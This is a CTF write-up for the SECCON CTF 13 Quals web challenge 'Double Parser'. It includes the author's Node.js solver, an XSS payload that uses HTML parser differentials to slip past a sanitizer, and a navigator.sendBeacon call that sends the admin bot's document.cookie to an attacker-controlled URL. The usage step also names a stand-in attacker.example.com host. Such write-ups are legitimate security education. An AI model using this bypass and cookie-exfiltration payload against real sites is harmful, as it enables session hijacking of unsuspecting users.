---
title: "Double Parser - SECCON CTF 13 Quals 2024"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "double", "parser", "web", "seccon-ctf-13-quals"]
summary: "HTML parsers are effective in detecting XSS attacks :)"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/double-parser"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Quals"
  year: 2024
  challenge: "Double Parser"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/double-parser>
- **CTF:** SECCON CTF 13 Quals 2024

---

# [web] double-parser

## Description

HTML parsers are effective in detecting XSS attacks :)

- Challenge: `http://double-parser.seccon.games:3000`
- Admin bot: `http://double-parser.seccon.games:1337`

## Attachments

- [double-parser](files)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it --rm \
    -e SECCON_HOST=localhost \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/double-parser/solver/index.js>

```javascript
const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = `http://${process.env.SECCON_HOST ?? "localhost"}:1337`;
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const innerHtml = `
<!--\nnavigator.sendBeacon('${CONNECTBACK_URL}',document.cookie)//
`.trim();

const outerHtml = `
<noembed><textarea></noembed><textarea></textarea><plaintext></noembed><!><script src="/?html=${encodeURIComponent(
  innerHtml
)}"><!></script>
`.trim();

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(`http://web:3000/?html=${encodeURIComponent(outerHtml)}`);

  await sleep(5 * 1000);
  fail("Failed");
});
```
